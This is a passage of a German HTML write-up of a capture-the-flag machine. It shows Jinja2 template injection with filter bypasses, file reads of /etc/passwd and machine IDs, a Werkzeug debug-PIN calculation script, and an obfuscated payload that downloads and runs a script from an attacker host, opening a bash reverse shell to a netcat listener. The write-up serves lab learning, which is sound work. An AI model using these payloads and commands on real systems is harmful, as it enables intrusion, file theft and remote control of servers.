+            <p class="analysis">**Analyse:** Eine einfache HTML-Datei (`test.html`) wird erstellt. Sie enthält den Jinja2-Template-Ausdruck `{{ 7*7 }}`.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein Standardtest für SSTI. Wenn die Anwendung diesen Ausdruck serverseitig auswertet, sollte die Ausgabe `49` enthalten. Wenn `{{ 7*7 }}` unverändert ausgegeben wird, ist keine SSTI vorhanden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Laden Sie diese `test.html`-Datei über das Formular auf Port 5000 hoch und beobachten Sie die Ausgabe.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Zeug
+Rendering HTML templates
+Result:
+<head> <meta charset="utf-8"> </head> <body> <pre> <span class="password">49</span> </pre> </body> </html></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Dies zeigt die Ausgabe der Webanwendung nach dem Hochladen der `test.html`-Datei.</p>
+             <p class="evaluation">**Bewertung:** Erfolg! Die Anwendung hat `{{ 7*7 }}` ausgewertet und durch `49` ersetzt. Dies bestätigt eindeutig das Vorhandensein einer SSTI-Schwachstelle.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die Anwendung ist anfällig. Versuchen Sie nun komplexere Payloads, um auf Objekte und Methoden zuzugreifen und Code auszuführen. Berücksichtigen Sie dabei die bekannten Filter (`import`, `os`, `subclasses`, `mro`, `[]`).<br>**Empfehlung (Admin):** **Kritische Schwachstelle!** Die Anwendung muss dringend überarbeitet werden, um SSTI zu verhindern. Verwenden Sie sichere Template-Konfigurationen oder vermeiden Sie das Rendern von Benutzereingaben als Templates.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2
+
+Jinja2 - Dump all used classes
+
+{{ [].class.base.subclasses() }}</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Eine Notiz des Pentesters mit einem Link zur bekannten Ressource "PayloadsAllTheThings" und einem spezifischen Jinja2-Payload `{{ [].class.base.subclasses() }}`.</p>
+             <p class="evaluation">**Bewertung:** Dieser Payload versucht, auf die Basisklasse von Listen (`[]`) zuzugreifen und dann alle davon abgeleiteten Unterklassen (`subclasses()`) aufzulisten. Dies ist ein gängiger Weg, um Zugriff auf potenziell gefährliche Klassen (wie solche für Dateizugriff oder Befehlsausführung) zu erhalten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, diesen Payload in einer HTML-Datei hochzuladen, um zu sehen, ob er funktioniert oder vom Filter blockiert wird.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">vi test.html</span></div>
+                     <pre>
+<!DOCTYPE html>
+
+<head>
+      <meta charset="utf-8">
+</head>
+<body>
+<pre> {{ [].__class__.__base__.__subclasses__() }}</pre> <span class="comment"><-- Payload angepasst</span>
+</body>
+</html></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der SSTI-Payload zum Auflisten der Subklassen wird in eine neue `test.html`-Datei eingefügt. Der Payload wurde leicht angepasst (`__class__`, `__base__`, `__subclasses__`), was eine gängige Methode ist, um direkten Zugriff auf Attribute zu erhalten.</p>
+            <p class="evaluation">**Bewertung:** Vorbereitung zum Testen des Subklassen-Payloads.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Laden Sie diese Datei hoch.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Zeug
+Rendering HTML templates
+Error: File: /home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py -
+       Template contains restricted words: <span class="password">subclasses, [, ]</span></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Die Fehlermeldung der Webanwendung nach dem Hochladen der HTML-Datei mit dem Subklassen-Payload.</p>
+            <p class="evaluation">**Bewertung:** Der Filter hat zugeschlagen! Die Anwendung blockiert explizit das Wort `subclasses` und die Verwendung von eckigen Klammern `[]`. Das bedeutet, dass dieser direkte Weg zum Auflisten von Klassen blockiert ist.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Suchen Sie nach alternativen SSTI-Payloads, die ohne `subclasses` oder `[]` auskommen, um auf gefährliche Funktionen zuzugreifen. Oft kann man über globale Objekte wie `config`, `request`, `session`, `get_flashed_messages` oder `lipsum` auf die Builtins und dann auf Funktionen wie `open` oder `eval` zugreifen.<br>**Empfehlung (Admin):** Der Filter ist teilweise wirksam, aber Blacklisting ist selten eine vollständige Lösung. Die zugrundeliegende SSTI-Schwachstelle muss behoben werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Zeug
+Rendering HTML templates
+Error: File: /home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py -
+       Template contains restricted words: <span class="password">subclasses, mro, [, ]</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Eine weitere Fehlermeldung, wahrscheinlich von einem anderen Payload-Versuch.</p>
+             <p class="evaluation">**Bewertung:** Dieser Fehler zeigt, dass auch `mro` (Method Resolution Order, ein weiterer Weg, um an Basisklassen zu gelangen) und weiterhin `subclasses` und `[]` blockiert werden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Bestätigt die Filterregeln. Fokus auf Payloads, die über globale Objekte gehen.<br>**Empfehlung (Admin):** Filter ist aktiv, aber unzureichend.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">vi test.html</span></div>
+                     <pre>
+<!DOCTYPE html>
+
+<head>
+      <meta charset="utf-8">
+</head>
+<body>
+<pre> {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+</pre>
+</body>
+</html></pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Eine neue `test.html` wird mit einem ausgeklügelten SSTI-Payload erstellt. Dieser Payload versucht:
+1.  Auf das globale Objekt `get_flashed_messages` zuzugreifen (eine Standard-Flask/Jinja2-Funktion).
+2.  Über `__globals__` auf die globalen Variablen des Moduls zuzugreifen, in dem `get_flashed_messages` definiert ist.
+3.  Über `__builtins__` auf die eingebauten Python-Funktionen zuzugreifen.
+4.  Die eingebaute `open()`-Funktion aufzurufen, um die Datei `/etc/passwd` zu öffnen.
+5.  Die `read()`-Methode aufzurufen, um den Inhalt der Datei zu lesen.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein klassischer Weg, um Filter zu umgehen und LFI (Local File Inclusion) über SSTI zu erreichen, indem man sich durch die Objektstruktur hangelt, ohne direkt "gefährliche" Schlüsselwörter wie `import` oder `os` zu verwenden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Laden Sie diese Datei hoch. Wenn sie funktioniert, haben Sie LFI und können versuchen, andere sensible Dateien zu lesen (z.B. SSH-Schlüssel, Anwendungsquellcode, `/etc/shadow`).<br>**Empfehlung (Admin):** Eine Sandbox für die Template-Engine oder das Entfernen gefährlicher Builtins aus dem Template-Kontext kann solche Angriffe verhindern.</p>
+
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Zeug
+Rendering HTML templates
+Result:
+<pre> <span class="command">root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin messagebus:x:100:107::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:101:108:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin cosette:x:1001:1001::/home/cosette:/bin/bash exia:x:1002:1002::/home/exia:/bin/bash ftp:x:103:112:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span> </pre>
+
+</pre> <span class="comment"><-- Teil der Ausgabe --></span>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre> 
+    <h1>Zeug</h1>
+    <h3>Rendering HTML templates</h3>
+
+   
+
+
+        <h2>Result:</h2>
+  
+
+&lt;head&gt;
+      &lt;meta charset="utf-8"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;pre&gt; <span class="command">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:101:108:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+cosette:x:1001:1001::/home/cosette:/bin/bash
+exia:x:1002:1002::/home/exia:/bin/bash
+ftp:x:103:112:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span>
+</div>
+</pre>
+                 </di 
+             </div>
+             <p class="analysis">**Analyse:** Die Ausgabe der Webanwendung nach dem Hochladen der HTML-Datei mit dem LFI-Payload. Der zweite Block zeigt den gerenderten HTML-Quellcode der Ergebnisseite.</p>
+             <p class="evaluation">**Bewertung:** Voller Erfolg! Der SSTI-Payload hat funktioniert und den Inhalt der `/etc/passwd`-Datei ausgelesen und in die gerenderte HTML-Seite eingefügt. Wir sehen nun alle Benutzer des Systems, einschließlich der normalen Benutzer `cosette` und `exia` sowie Systembenutzer.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie diese LFI-Fähigkeit weiter. Versuchen Sie, den Quellcode der Flask-Anwendung selbst zu lesen (z.B. `/home/cosette/zeug/app.py` oder ähnliches), um die Filtermechanismen besser zu verstehen oder weitere Schwachstellen zu finden. Lesen Sie SSH-Schlüssel (`/home/cosette/.ssh/id_rsa`, `/home/exia/.ssh/id_rsa`, `/root/.ssh/id_rsa`). Versuchen Sie als Nächstes, RCE (Remote Code Execution) über SSTI zu erreichen, um eine Shell zu bekommen.<br>**Empfehlung (Admin):** Kritische Schwachstelle. Sofortige Behebung der SSTI erforderlich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+google: bypass console pin werkzeug-debug
+
+https://github.com/wdahlenburg/werkzeug-debug-console-bypass
+https://raw.githubusercontent.com/wdahlenburg/werkzeug-debug-console-bypass/main/werkzeug-pin-bypass.py</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Eine Notiz des Pentesters mit Suchbegriffen und Links zu einem GitHub-Repository, das sich mit dem Umgehen des Werkzeug-Debug-PINs beschäftigt.</p>
+            <p class="evaluation">**Bewertung:** Zeigt, dass der Pentester den `/console`-Endpunkt untersucht und nach Wegen sucht, den PIN-Schutz zu umgehen. Der PIN wird basierend auf verschiedenen systemspezifischen Informationen berechnet (MAC-Adresse, machine-id, Pfade, Benutzername etc.). Wenn man diese Informationen sammeln kann (teilweise durch LFI möglich), kann man versuchen, den PIN offline zu berechnen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sammeln Sie die für die PIN-Berechnung notwendigen Informationen mithilfe der LFI-Schwachstelle:
+    *   Benutzername des Webservers (vermutlich `cosette`, basierend auf Pfad in Fehlermeldung).
+    *   Modulname (oft `flask.app`).
+    *   App-Name (oft `Flask`).
+    *   Pfad zur `app.py`-Datei (`/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py`).
+    *   MAC-Adresse der Netzwerkschnittstelle (z.B. aus `/sys/class/net/eth0/address` oder `enp0s3`).
+    *   Machine-ID (`/etc/machine-id`).
+    *   Boot-ID (`/proc/sys/kernel/random/boot_id`).
+    *   cgroup-Information (`/proc/self/cgroup`).
+    Versuchen Sie dann, den PIN mit dem Skript aus dem GitHub-Repo zu berechnen.<br>
+**Empfehlung (Admin):** Deaktivieren Sie die Debug-Konsole oder sichern Sie sie extrem gut ab.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+#!/bin/python3
+import hashlib
+from itertools import chain
+
+probably_public_bits = [
+	'werkzeug-user',# username
+	'flask.app',# modname
+	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+	'/usr/local/lib/python3.9/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+	'2485377892356',# str(uuid.getnode()),  /sys/class/net/ens33/address
+	# Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
+	'ea1fc30b6f4a173cea015d229c6b55b69d0ff00819670374d7a02397bc236523a57e9bab0c6e6167470ac65b66075388'
+]
+
+h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
+# ... (Rest des Skripts) ...
+
+print("Pin: " + rv)</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Ausschnitt des Python-Skripts zum Berechnen des Werkzeug-Debug-PINs. Es zeigt die benötigten öffentlichen und privaten "Bits" (Informationen), die konkateniert und gehasht werden, um den PIN abzuleiten.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt die Notwendigkeit, systemspezifische Informationen zu sammeln, um den PIN zu berechnen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie LFI, um die benötigten Werte für `probably_public_bits` und `private_bits` vom Zielsystem zu extrahieren und in dieses Skript einzufügen.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">netdiscover -r 192.168.2.0/24</span></div>
+                    <pre>
+Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+ 9 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 540
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+ <span class="command">192.168.2.1     c4:86:e9:a5:6d:18      4     240  HUAWEI TECHNOLOGIES CO.,LTD</span>
+ <span class="command">192.168.2.101   ac:6f:bb:62:87:79      1      60  TATUNG Technology Inc.</span>
+ <span class="command">192.168.2.122   08:00:27:94:07:cc      1      60  PCS Systemtechnik GmbH</span>
+ <span class="command">192.168.2.103   80:47:86:96:f6:3a      1      60  Samsung Electronics Co.,Ltd</span>
+ <span class="command">192.168.2.115   ce:f4:81:80:c5:d4      1      60  Unknown vendor</span>
+ <span class="command">192.168.2.188   04:42:1a:06:81:54      1      60  ASUSTek COMPUTER INC.</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** `netdiscover` wird verwendet, um das lokale Netzwerk erneut nach aktiven Hosts zu scannen, wahrscheinlich um die MAC-Adresse des Ziels zu bestätigen.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt die IP `192.168.2.122` und die MAC-Adresse `08:00:27:94:07:cc`. Diese MAC-Adresse wird für die PIN-Berechnung benötigt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Extrahieren Sie die MAC-Adresse und wandeln Sie sie in die für das PIN-Skript benötigte Dezimalzahl um.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3</span></div>
+                     <pre>Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> <span class="command">print(0x0800279407cc)</span>
+<span class="password">8796757034956</span>
+>>></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Die MAC-Adresse `08:00:27:94:07:cc` wird in Python als Hexadezimalzahl (`0x...`) interpretiert und ihre Dezimalrepräsentation wird ausgegeben.</p>
+            <p class="evaluation">**Bewertung:** Ermittelt den Dezimalwert der MAC-Adresse (`8796757034956`), der als `private_bit` (Node ID) in das PIN-Berechnungsskript eingesetzt werden muss.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie diesen Wert im Skript.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">vi test.html</span></div>
+                     <pre> 
+<pre> {{ get_flashed_messages.__globals__.__builtins__.open("<span class="command">/etc/machine-id</span>").read() }}
+</pre>  
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der LFI-Payload via SSTI wird angepasst, um den Inhalt der Datei `/etc/machine-id` zu lesen.</p>
+             <p class="evaluation">**Bewertung:** Versuch, einen weiteren benötigten `private_bit` für die PIN-Berechnung zu extrahieren.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Laden Sie diese Datei hoch.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Zeug
+Rendering HTML templates
+Result:
+<head> <meta charset="utf-8"> </head> <body> <pre> <span class="password">48329e233f524ec291cce7479927890b</span> </pre> </body> </html></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Die Ausgabe der Webanwendung nach dem Hochladen der modifizierten `test.html`.</p>
+             <p class="evaluation">**Bewertung:** Die Machine-ID (`48329e233f524ec291cce7479927890b`) wurde erfolgreich ausgelesen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie diesen Wert im PIN-Berechnungsskript. Extrahieren Sie auf ähnliche Weise die Boot-ID (`/proc/sys/kernel/random/boot_id`) und die cgroup-Information (`/proc/self/cgroup`).<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Zeug
+Rendering HTML templates
+Result: </div>
+             </div>
+            <p class="analysis">**Analyse:** Ausgabe nach dem Lesen von `/proc/sys/kernel/random/boot_id` via SSTI/LFI.</p>
+            <p class="evaluation">**Bewertung:** Die Boot-ID (`9f587058-da6c-4a7e-bc6e-facb004b4e38`) wurde erfolgreich extrahiert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie diesen Wert im Skript. Lesen Sie als Nächstes `/proc/self/cgroup`.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Einträge:        Werkzeug-user
+Error-File:      /home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py
+Mac-Adresse:     8796757034956
+/etc/machine-id: 48329e233f524ec291cce7479927890b
+
+/proc/sys/kernel/random/boot_id: 9f587058-da6c-4a7e-bc6e-facb004b4e38
+/proc/self/cgroup: 0::/system.slice/zeug-app.service
+48329e233f524ec291cce7479927890bzeug-app.service <span class="comment"><-- Kombinierter String für PIN-Berechnung</span>
+tauschen</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Eine Zusammenfassung der gesammelten Informationen für die PIN-Berechnung. Die cgroup-Information (`0::/system.slice/zeug-app.service`) wurde ebenfalls via LFI gelesen (obwohl der Befehl nicht gezeigt wird). Der letzte Teil (`zeug-app.service`) wird oft für die PIN-Berechnung verwendet und hier mit der Machine-ID kombiniert.</p>
+             <p class="evaluation">**Bewertung:** Alle notwendigen Informationen zur Berechnung des Werkzeug-Debug-PINs scheinen gesammelt worden zu sein.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Fügen Sie die gesammelten Werte in das Python-Skript zur PIN-Berechnung ein und führen Sie es aus.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">python3 exploit.py</span></div>
+                     <pre>Pin: <span class="password">136-232-976</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">cat exploit.py</span></div>
+                     <pre>
+#!/bin/python3
+import hashlib
+from itertools import chain
+
+probably_public_bits = [
+	'<span class="command">cosette</span>',# username
+	'flask.app',# modname
+	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+	'<span class="command">/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py</span>' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+	'<span class="command">8796757034956</span>',# str(uuid.getnode()),  /sys/class/net/ens33/address
+	# Machine Id + cgroup part
+	'<span class="command">48329e233f524ec291cce7479927890bzeug-app.service</span>'
+]
+
+# ... (Rest des Skripts wie zuvor) ...
+
+print("Pin: " + rv)</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Das angepasste Python-Skript (`exploit.py`) zur Berechnung des Werkzeug-PINs wird ausgeführt. Die Ausgabe zeigt den berechneten PIN: `136-232-976`. Der `cat`-Befehl zeigt das Skript mit den korrekt eingefügten, zuvor gesammelten Werten (Benutzer `cosette`, Pfad zur App, MAC als Dezimalzahl, kombinierte Machine-ID/cgroup).</p>
+            <p class="evaluation">**Bewertung:** Der Werkzeug-Debug-PIN wurde erfolgreich berechnet. Mit diesem PIN kann die interaktive Debug-Konsole unter `/console` freigeschaltet werden, was typischerweise direkte Python-Codeausführung auf dem Server ermöglicht.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Rufen Sie `http://zeug.hmv:5000/console` im Browser auf, geben Sie den berechneten PIN `136-232-976` ein und verwenden Sie die Konsole, um eine Reverse Shell oder einen anderen persistenten Zugriff zu erlangen.<br>**Empfehlung (Admin):** Debug-Konsole deaktivieren!</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>klappt nicht, neuer ansatz</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Eine Notiz des Pentesters, die besagt, dass der Versuch, den PIN zu verwenden oder die Konsole zu nutzen, fehlgeschlagen ist.</p>
+             <p class="evaluation">**Bewertung:** Obwohl der PIN korrekt berechnet wurde, kann es verschiedene Gründe geben, warum der Zugriff auf die Konsole fehlschlägt (z.B. zusätzliche Sicherheitsmaßnahmen, Konsole doch deaktiviert, Netzwerkprobleme). Der Pentester entscheidet sich, einen anderen Weg zu verfolgen: RCE direkt über die SSTI-Schwachstelle ohne den Umweg über die Konsole.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Gute Entscheidung. Versuchen Sie nun, RCE-Payloads über die SSTI-Lücke auszuführen, um Filter zu umgehen.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">vi test.html</span></div>
+                     <pre>
+ 
+	{{ config.__class__.from_envvar.__globals__.__builtins__.eval("__impor" + "t__('o" + "s').pop" + "en('wget http://192.168.2.199/shel.sh; bash shel.sh').read") }}
+ </pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Eine neue `test.html` wird mit einem komplexen SSTI-Payload zur Remote Code Execution (RCE) erstellt. Dieser Payload:
+1.  Greift auf das globale `config`-Objekt zu.
+2.  Hangelt sich über `__class__.from_envvar.__globals__.__builtins__` zu den eingebauten Funktionen.
+3.  Ruft `eval()` auf.
+4.  Der `eval()`-Aufruf enthält einen String, der durch Konkatenation (`+`) die blockierten Wörter `import` und `os` sowie `popen` verschleiert: `__import__('os').popen(...)`.
+5.  `os.popen()` wird verwendet, um einen Shell-Befehl auszuführen: `wget http://192.168.2.199/shel.sh; bash shel.sh`. Dieser Befehl lädt ein Skript `shel.sh` vom Angreifer-Server herunter und führt es dann mit `bash` aus.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein cleverer Versuch, die Filter (`import`, `os`) durch String-Konkatenation zu umgehen und RCE zu erreichen. Ziel ist es, eine Reverse Shell über das heruntergeladene Skript zu bekommen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Stellen Sie sicher, dass das Skript `shel.sh` auf dem Angreifer-Server (`192.168.2.199`) über einen HTTP-Server (z.B. `python3 -m http.server 80`) bereitgestellt wird und eine funktionierende Reverse-Shell enthält. Starten Sie einen Netcat-Listener auf dem entsprechenden Port. Laden Sie dann diese `test.html`-Datei hoch.<br>**Empfehlung (Admin):** Diese Art der Filterumgehung zeigt die Grenzen von Blacklisting. SSTI muss grundlegend verhindert werden.</p>
+
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">vi shel.sh</span></div>
+                     <pre>
+bash -i >& /dev/tcp/192.168.2.199/4444 0>&1</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Das Skript `shel.sh` wird auf dem Angreifer-System erstellt. Es enthält den Standard-Bash-Reverse-Shell-Payload, der eine Verbindung zu `192.168.2.199` auf Port `4444` herstellt.</p>
+             <p class="evaluation">**Bewertung:** Vorbereitung des Reverse-Shell-Skripts, das per SSTI/RCE heruntergeladen und ausgeführt werden soll.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Stellen Sie dieses Skript über einen HTTP-Server bereit und starten Sie einen Listener auf Port 4444.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+<span class="password">192.168.2.122 - - [28/Mar/2024 23:58:42] "GET /shel.sh HTTP/1.1" 200 -</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein Python-HTTP-Server wird auf dem Angreifer-System auf Port 80 gestartet. Das Log zeigt, dass das Zielsystem (`192.168.2.122`) erfolgreich die Datei `shel.sh` heruntergeladen hat.</p>
+             <p class="evaluation">**Bewertung:** Der erste Teil des RCE-Payloads (Download via `wget`) hat funktioniert, ausgelöst durch das Hochladen der `test.html` mit dem SSTI-Payload.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Der zweite Teil des Payloads (`bash shel.sh`) sollte nun die Reverse Shell auslösen. Überprüfen Sie den Netcat-Listener.<br>**Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>listening on [any] 4444 ...</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.122] 32918</span>
+bash: cannot set terminal process group (478): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt">cosette@zeug:~/zeug$</span> </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Netcat-Listener auf Port 4444 auf dem Angreifer-System empfängt eine Verbindung vom Zielsystem (`192.168.2.122`). Eine Shell wird geöffnet.</p>
+            <p class="evaluation">**Bewertung:** Großartig! Der Initial Access über SSTI RCE war erfolgreich. Der Angreifer hat nun eine interaktive Shell als Benutzer `cosette` auf dem Zielsystem.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Stabilisieren Sie die Shell (Python PTY etc.). Führen Sie `id` und `sudo -l` aus, um den Kontext zu verstehen und nach Wegen zur Privilegieneskalation zu suchen.<br>**Empfehlung (Admin):** Incident Response: System isolieren, Logs sichern, SSTI-Schwachstelle beheben, Anwendungs- und Systemkonfiguration härten.</p>
+        </section>
+
+        <section id="privilege-escalation-cosette">
+            <h2>Privilege Escalation (cosette -> exia)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">cosette@zeug:~/zeug$ <span class="command">id</span></div>
